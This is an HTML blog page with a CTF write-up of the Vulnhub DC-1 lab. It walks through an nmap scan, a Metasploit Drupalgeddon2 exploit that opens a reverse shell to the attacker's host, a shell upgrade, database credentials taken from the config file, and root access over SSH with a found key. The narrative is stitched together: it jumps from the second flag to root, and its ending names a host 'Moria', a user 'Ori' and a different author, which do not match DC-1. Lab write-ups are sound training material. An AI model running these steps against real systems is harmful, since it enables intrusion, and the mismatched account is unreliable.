<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>DC-1 CTF</title>

	<!-- BootstrapCDN -- >
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

	<!-- jQuery library -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

	<!-- Latest compiled JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

	<!-- Google Fonts -->
  	<link href="https://fonts.googleapis.com/css?family=Droid+Sans+Mono|Inconsolata" rel="stylesheet">

  	<!-- style sheet -->
	<link rel="stylesheet" type="text/css" href="/css/style.css">

	<!--Google Analytics -->
	<script>
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

	ga('create', 'UA-52352656-1', 'auto');
	ga('send', 'pageview');
	</script>

	<!--Prism Theme-->
	<link href="/themes/prism.css" rel="stylesheet" />
</head>

<body>
<!-- Prism JS -->
	<script src="/js/prism.js"></script>

	<div class="jumbotron text-center">
	  <h1>DC-1: 1 CTF</h1>
	  <p>March 22nd, 2019</p>
	  <p>CTF Write-Up</p>
	</div>

	<div class="container">
	  <div class="row">
	    <div class="col-sm-12">
	    <a href="https://jessecbrown.com"><----Back to jessecbrown.com</a>
	      <h3>Background</h3>
	      <p>This write-up covers the DC-1: 1 CTF on <a href="https://www.vulnhub.com/entry/dc-1-1,292/" target="_blank">Vulnhub.com</a></p>
				<br>
				<p>There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory. You don't even need to be root to do this, however, you will require root privileges.</p>
	      <h3>Reconnaissance</h3>
	      <p>To get started, let's see what NMAP finds:</p>
	      <br>
	      <!-- NMAP Code-->
			<pre><code class="language-none">
				root@kali:~# nmap -sSV -p- 192.168.18.129

				Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-24 21:37 EDT
				Nmap scan report for 192.168.18.129
				Host is up (0.00055s latency).
				Not shown: 65531 closed ports
				PORT      STATE SERVICE VERSION
				22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
				80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
				111/tcp   open  rpcbind 2-4 (RPC #100000)
				35352/tcp open  status  1 (RPC #100024)
				MAC Address: 00:0C:29:64:56:73 (VMware)
				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

			</code></pre>
			<br>
			<p>Browsing to the site shows a Drupal login page. <code>DRIB</code> found a few interesting items, but I couldn't find a CHANGELOG.txt to identify the Drupal version. However, viewing the source code shows it is running
			Drupal 7 on line 17: </p>
			<br>
<pre><code class="language-none">
			&lt;meta name=&quot;Generator&quot; content=&quot;Drupal 7 (http://drupal.org)&quot; /&gt;
</code></pre>
			<br>
			<h3>Gaining Access</h3>
			<br>
			<p><code>DIRB</code> didn't find anything useful. This seems like a typical default Drupal install. I diecided to fire up Metasploit to see if the site is vulnerable to any of the Drupal 7 RCE exploits. </p>
			<br>
<pre><code class="language-none">
	wake up, Neo...
the matrix has you
follow the white rabbit.

	knock, knock, Neo.

								(`.         ,-,
								` `.    ,;' /
								 `.  ,'/ .'
									`. X /.'
				.-;--''--.._` ` (
			.'            /   `
		 ,           ` '   Q '
		 ,         ,   `._    \
	,.|         '     `-.;_'
	:  . `  ;    `  ` --,.._;
	 ' `    ,   )   .'
			`._ ,  '   /_
				 ; ,''-,;' ``-
					``-..__``--`

										 https://metasploit.com


=[ metasploit v5.0.2-dev                           ]
+ -- --=[ 1852 exploits - 1046 auxiliary - 325 post       ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]
+ -- --=[ ** This is Metasploit 5 development branch **   ]

msf5 > search drupal

Matching Modules
================

Name                                           Disclosure Date  Rank       Check  Description
----                                           ---------------  ----       -----  -----------
auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > SET RHOST 192.168.18.129
[-] Unknown command: SET.
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

Name         Current Setting  Required  Description
----         ---------------  --------  -----------
DUMP_OUTPUT  false            no        If output should be dumped
PHP_FUNC     passthru         yes       PHP function to execute
Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                        yes       The target address range or CIDR identifier
RPORT        80               yes       The target port (TCP)
SSL          false            no        Negotiate SSL/TLS for outgoing connections
TARGETURI    /                yes       Path to Drupal install
VHOST                         no        HTTP server virtual host


Exploit target:

Id  Name
--  ----
0   Automatic (PHP In-Memory)

msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.18.129
RHOSTS => 192.168.18.129
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.18.128:4444
[*] Drupal 7 targeted at http://192.168.18.129/
[-] Could not determine Drupal patch level
[*] Sending stage (38247 bytes) to 192.168.18.129
[*] Meterpreter session 1 opened (192.168.18.128:4444 -> 192.168.18.129:52916) at 2019-03-25 20:38:02 -0400
shell
ls

meterpreter > shell
Process 3685 created.
Channel 0 created.
whoami
www-data

python -c 'import pty; pty.spawn("/bin/bash")'
www-data@DC-1:/var$ cd www
cd www
www-data@DC-1:/var/www$ ls
ls
COPYRIGHT.txt	    LICENSE.txt      cron.php	  misc	      sites
INSTALL.mysql.txt   MAINTAINERS.txt  flag1.txt	  modules     themes
INSTALL.pgsql.txt   README.txt	     includes	  profiles    update.php
INSTALL.sqlite.txt  UPGRADE.txt      index.php	  robots.txt  web.config
INSTALL.txt	    authorize.php    install.php  scripts     xmlrpc.php
www-data@DC-1:/var/www$
</code></pre>
			<br>
			<p>And we're in! I upgrade the shell using python and it looks like the first flag is in the web root: </p>
			<br>
<pre><code class="language-none">
	www-data@DC-1:/var/www$ cat flag1.txt
	cat flag1.txt
	Every good CMS needs a config file - and so do you.
</code></pre>
    		<br>
    		<p>Seems like we should take a look at the Drupal site config... and that's where the second flag can be found. There are also the DrupalDB user credentials:</p>
    		<br>
   			<pre><code class="language-none">
					/**
					 *
					 * flag2
					 * Brute force and dictionary attacks aren't the
					 * only ways to gain access (and you WILL need access).
					 * What can you do with these credentials?
					 *
					 */

					$databases = array (
					  'default' =>
					  array (
					    'default' =>
					    array (
					      'database' => 'drupaldb',
					      'username' => 'dbuser',
					      'password' => 'R0ck3t',
					      'host' => 'localhost',
					      'port' => '',
					      'driver' => 'mysql',
					      'prefix' => '',
</code></pre>
			<br>
			<p>Unfortunately, the poem didn't seem to offer any hints. This is where I spent the majority of my time with this CTF. Baesed on how this CTF had gone so far I was pretty sure it wouldn't involve any carzy exploits. g0tmi1k's guide to linux privilege escalation came in handy. I went through most of the guide until I reached his section on private keys. Earlier I had noticed there was a SSH key located in ~/.ssh/ and under closer inspection the loopback address of 127.0.0.1 was in the known_hosts list. Interesting. The id_rsa key didn't appear to be for Ori... after a few attempts I realized I could SSH as root without using a password! Here's the flag: </p>
			<br>
<pre><code class="language-none">
-bash-4.2$ cat ~/.ssh/known_hosts
127.0.0.1 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuLX/CWxsOhekXJRxQqQH/Yx0SD+XgUpmlmWN1Y8cvmCYJslOh4vE+I6fmMwCdBfi4W061RmFc+vMALlQUYNz0=

-bash-4.2$ ssh -i id_rsa root@127.0.0.1
Last failed login: Tue May  9 01:19:10 EDT 2017 on pts/0
There were 4 failed login attempts since the last successful login.
Last login: Tue Mar 14 23:56:24 2017
[root@Moria ~]# cat flag.txt
“All that is gold does not glitter,
Not all those who wander are lost;
The old that is strong does not wither,
Deep roots are not reached by the frost.

From the ashes a fire shall be woken,
A light from the shadows shall spring;
Renewed shall be blade that was broken,
The crownless again shall be king.”

All That is Gold Does Not Glitter by J. R. R. Tolkien

I hope you suff.. enjoyed this VM. It wasn't so hard, was it?
-Abatchy


</code></pre>
		<br>
		<p>Thanks to @abatchy for a good challenge, and @g0tmi1k for hosting on Vulnhub! </p>
    	<br>
	    </div>
	  </div>
	</div>

<footer style="width: 100%; text-align: center; padding-top: 25px; color: #98999E;">
	<div class="col-md-16 text-center">
		<a href="https://twitter.com/jessecarlbrown" class="twitter-follow-button" data-show-count="false">Follow @jessecarlbrown</a><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
		<br>
		<br>
		<span>Jesse Brown © 2019<span>
		</span></span></footer>
		<br>
		<br>

	</div>
</body>
</html>
